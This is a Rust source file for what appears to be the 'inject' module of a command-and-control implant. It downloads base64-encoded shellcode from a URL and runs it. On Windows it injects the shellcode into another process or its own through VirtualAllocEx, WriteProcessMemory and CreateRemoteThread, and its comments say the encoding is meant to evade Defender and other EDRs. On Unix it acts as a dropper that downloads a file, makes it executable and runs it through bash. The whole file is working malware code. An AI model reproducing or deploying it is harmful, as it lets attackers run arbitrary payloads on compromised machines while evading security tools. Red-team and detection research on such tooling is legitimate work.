use std::error::Error;
use litcrypt::lc;
#[cfg(windows)] use base64::decode as b64_decode;
#[cfg(windows)] use reqwest::Client;
#[cfg(windows)] use crate::logger::{Logger, log_out};
#[cfg(not(windows))] use crate::logger::Logger;
use crate::cmd::{CommandArgs, command_out};
#[cfg(windows)] use windows::Win32:: {
    Foundation::{
        CloseHandle,
        // GetLastError,
        BOOL, 
    },
    System::{
        Memory::{
            VirtualAlloc,
            VirtualAllocEx, 
            VirtualProtect, 
            PAGE_PROTECTION_FLAGS,
            MEM_COMMIT,
            MEM_RESERVE,
            PAGE_READWRITE,
            PAGE_EXECUTE_READ,
            PAGE_EXECUTE_READWRITE
        },
        Threading::{
            OpenProcess,
            CreateThread,
            CreateRemoteThread,
            // WaitForSingleObject,
            THREAD_CREATION_FLAGS,
            PROCESS_ALL_ACCESS
        },
        Diagnostics::Debug::WriteProcessMemory,
        // WindowsProgramming::INFINITE
    },
};
#[cfg(windows)] use std::ptr;
#[cfg(windows)] use core::ffi::c_void; 

#[cfg(windows)]
async fn decode_shellcode(sc: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, String> {
    logger.debug(log_out!("Starting shellcode debug"));
    let mut shellcode_vec = Vec::from(sc.trim().as_bytes());
    for i in 0..b64_iterations {
        logger.debug(log_out!("Decode iteration: ", &i.to_string()));
        match b64_decode(shellcode_vec) {
            Ok(d) => {
                shellcode_vec = d
                    .into_iter()
                    .filter(|&b| b != 0x0a)
                    .collect();
            },
            Err(e) => { 
                let err_msg = e.to_string();
                logger.err(err_msg.to_owned());
                return Err(err_msg.to_owned()); 
            }
        };
    }
    Ok(shellcode_vec)
}


/// Handles the retrieval and deobfuscation of shellcode from a url.
#[cfg(windows)]
async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, String> {
    // Download shellcode, or try to
    let client = Client::new();
    if let Ok(r) = client.get(url).send().await {
        if r.status().is_success() {   
            logger.info(log_out!("Downloaded shellcode")); 
            // Get the shellcode. Now we have to decode it
            let shellcode_decoded: Vec<u8>;
            let shellcode_final_vec: Vec<u8>;
            if let Ok(sc) = r.text().await {
                logger.info(log_out!("Got encoded bytes"));
                logger.debug(log_out!("Encoded shellcode length: ", &sc.len().to_string()));
                match decode_shellcode(sc, b64_iterations, logger).await {
                    Ok(scd) => { shellcode_decoded = scd; },
                    Err(e)  => { return Err(e); }
                }; 
                
                
                #[cfg(windows)] {
                    // Convert bytes to our proper string
                    // This only happens on Windows
                    let shellcode_string: String;
                    if let Ok(s) = String::from_utf8(shellcode_decoded) {
                        shellcode_string = s;
                    } else {
                        let err_msg = lc!("Could not convert bytes to string");
                        logger.err(err_msg.to_owned());
                        return Err(err_msg.to_owned());
                    }                    
                    // At this point, we have the comma-separated "0xNN" form of the shellcode.
                    // We need to get each one until a proper u8.
                    // Now, keep in mind we only do this for Windows, because we pretty much only make raw byes,
                    // Not '0x' strings for Linux.
                    shellcode_final_vec = shellcode_string
                        .split(",")
                        .map(|s| s.replace("0x", ""))
                        .map(|s| s.replace(" ", ""))                    
                        .map(|s|{ 
                            match u8::from_str_radix(&s, 16) {
                                Ok(b) => b,
                                Err(_) => 0
                            }
                        })
                        .collect();
                }

                #[cfg(not(windows))] {
                    shellcode_final_vec = shellcode_decoded;
                }
                
                // The actual success
                return Ok(shellcode_final_vec);

            } else {
                let err_msg = lc!("Could not decode shellcode");
                logger.err(err_msg.to_owned());
                return Err(err_msg.to_owned());
            }

        } else {
            return Err(r.text().await.unwrap());
        }   

    } else {
        return Err(lc!("Could not download shellcode"));
    }
} 

/// Shellcode-based attacks for further compromise.
/// 
/// On Windows, this will attempt process injection.
/// 
/// To avoid shellcode detection by Defender and other EDRs,
/// the shellcode is expected to be b64-encoded, comma-separated hex representations
/// of the shellcode, which is decoded at runtime.
/// 
/// The shellcode can be encoded `b64_iterations` times to make extra work for EDRs to process the payload.
/// This has proven effective in initial evasion.
/// 
/// ### Examples
/// Usage: `inject [shellcode_method] [shellcode_url] [b64_iterations] [[pid]] 🎯`
/// 
/// On Linux, the payload will be downloaded and executed like a regular dropper.
#[cfg(windows)] 
pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {

    if let Some(inject_type) = cmd_args.nth(0) {

        // Set up our variables; each one could fail on us.
        // Yes this is a lot of verbose error checking, but this
        // has to be rock solid or the agent will die.
        let url: String;
        let b64_iterations: u32;

        // Get URL
        match cmd_args.nth(0) {
            Some(u) => { 
                logger.debug(log_out!("Shellcode URL: ", &u));
                url = u; 
            },
            None    => { return command_out!("Could not parse URL"); }
        };

        // Get b64_iterations
        match cmd_args.nth(0) {
            Some(bs) => {
                if let Ok(b) = bs.parse::<u32>() {
                    b64_iterations = b;
                } else {
                    return command_out!("Could not parse b64 iterations");
                }
            },
            None => { return command_out!("Could not extract b64 iterations"); }
        };

        // CALL get_shellcode

        match inject_type.as_str() {
            "remote" => {
                // Get shellcode
                let shellcode: Vec<u8>; 
                match get_shellcode(url, b64_iterations, logger).await {
                    Ok(s) => { shellcode = s},
                    Err(e) => { return Ok(e.to_string()); }
                };
                let pid: u32;
                // Get pid
                match cmd_args.nth(0) {
                    Some(ps) => {
                        if let Ok(p) = ps.parse::<u32>() {
                            logger.debug(log_out!("Injecting into PID: ", &p.to_string()));
                            pid = p;
                            // Big thanks to trickster0
                            // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
                            unsafe {
                                let h = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
                                let addr = VirtualAllocEx(h, ptr::null_mut(), shellcode.len(), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
                                let mut n = 0;
                                WriteProcessMemory(&h, addr, shellcode.as_ptr() as  _, shellcode.len(), &mut n);
                                let _h_thread = CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
                                CloseHandle(&h);
                            }
                            return command_out!("Injection completed!");
                        } else {
                            let err_msg = lc!("Could not parse PID");
                            logger.err(err_msg.to_owned());
                            return Ok(err_msg.to_owned());
                        }
                    },
                    None => { 
                        let err_msg = lc!("Could not extract PID");
                        logger.err(err_msg.to_owned());
                        return Ok(err_msg.to_owned()); 
                    }
                };
            },
            "self"  => {
                // Get shellcode
                let shellcode: Vec<u8>; 
                match get_shellcode(url, b64_iterations, logger).await {
                    Ok(s) => { shellcode = s},
                    Err(e) => { return Ok(e.to_string()) }
                };

                logger.debug(log_out!("Injecting into current process..."));
                unsafe {

                    let base_addr = VirtualAlloc(
                        ptr::null_mut(),
                        shellcode.len(),
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_READWRITE,
                    );

                    if base_addr.is_null() {
                        logger.err(log_out!("Couldn't allocate memory to current proc."));
                    } else {
                        logger.debug(log_out!("Allocated memory to current proc."));
                    }

                    // copy shellcode into mem
                    logger.debug(log_out!("Copying Shellcode to address in current proc."));
                    std::ptr::copy(shellcode.as_ptr() as _, base_addr, shellcode.len());
                    logger.debug(log_out!("Copied..."));

                    // Flip mem protections from RW to RX with VirtualProtect. Dispose of the call with `out _`
                    logger.debug(log_out!("Changing mem protections to RX..."));

                    let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;

                    let mem_protect: BOOL = VirtualProtect(
                        base_addr,
                        shellcode.len(),
                        PAGE_EXECUTE_READ,
                        &mut old_protect,
                    );
        

                    if mem_protect.0 == 0 {
                        return command_out!("Error during injection");
                    }

                    // Call CreateThread
                    logger.debug(log_out!("Calling CreateThread..."));

                    let mut tid = 0;
                    let ep: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(base_addr) };

                    let h_thread = CreateThread(
                        ptr::null_mut(),
                        0,
                        Some(ep),
                        ptr::null_mut(),
                        THREAD_CREATION_FLAGS(0),
                        &mut tid,
                    );

                    if h_thread.is_invalid() {
                        logger.err(log_out!("Error during inject."));
                    } else {
                        logger.info(log_out!("Thread Id: ", &tid.to_string()));
                    }

                    // CreateThread is not a blocking call, so we wait on the thread indefinitely with WaitForSingleObject. This blocks for as long as the thread is running
                    // I do not know if this will have side effects, but if you omit the WaitForSingleObject call, the ON agent can continue to function after the thread injection takes place.
                    
                    //logger.debug("Calling WaitForSingleObject...".to_string());

                    //let status = WaitForSingleObject(h_thread, winbase::INFINITE);
                    //if status == 0 {
                    //    logger.info("Good!".to_string())
                    //} else {
                    //    let error = errhandlingapi::GetLastError();
                    //    logger.err(format!("{error}"));
                    //}
                }

                return command_out!("Injection completed!");
                
            },
            _ => command_out!("Unknown injection type!")
        }

    } else {
        return command_out!("Could not parse URL");
    }
    
         
}

#[cfg(unix)]
pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
    
    if let Some(inject_type) = cmd_args.nth(0) {

        // Set up our variables; each one could fail on us.
        // Yes this is a lot of verbose error checking, but this
        // has to be rock solid or the agent will die.
        let url: String;

        match inject_type.as_str() {
            "dropper" => {
                // Usage: inject dropper [url] [filename]
                // Get URL
                use crate::cmd::download;
                use std::os::unix::fs::PermissionsExt;
                let filename: String;
                use std::process::Command;

                match cmd_args.nth(0) {
                    Some(u) => { 
                        logger.debug(format!("Shellcode URL: {u}"));
                        url = u; 
                    },
                    None => { return command_out!("Could not parse URL"); }
                };

                // Get filename
                match cmd_args.nth(0) {
                    Some(f) => { 
                        logger.debug(format!("Filename: {f}"));
                        filename = f; 
                    },
                    None => { return command_out!("Could not parse filename"); }
                };

                let mut download_args = CommandArgs::from_string(
                    format!("{url} {filename}")
                );
                download::handle(&mut download_args, logger).await?;
                match std::fs::File::open(&filename) {
                    Ok(f) => {
                        f.set_permissions(PermissionsExt::from_mode(0o755))?;
                    },
                    Err(e) => { return Ok(e.to_string()); }
                };

                let mut cmd_string = String::new();

                // Basically, if it's not a proper path, add ./
                if !cmd_string.contains("/") {
                    cmd_string.push_str("./");
                }

                cmd_string.push_str(filename.as_str());

                // Fire off the command
                Command::new("/bin/bash")
                    .arg("-c")
                    .arg(cmd_string)
                    .spawn()?;

                command_out!("Dropper completed!")
            }
            _ => { return command_out!("Unknown injection method!") ;}
        }

    } else {
        return command_out!("No injection type provided!");
    }
}

#[cfg(macos)]
pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<String, Box<dyn Error>> {
    command_out!("Inject not available on macOS!")
}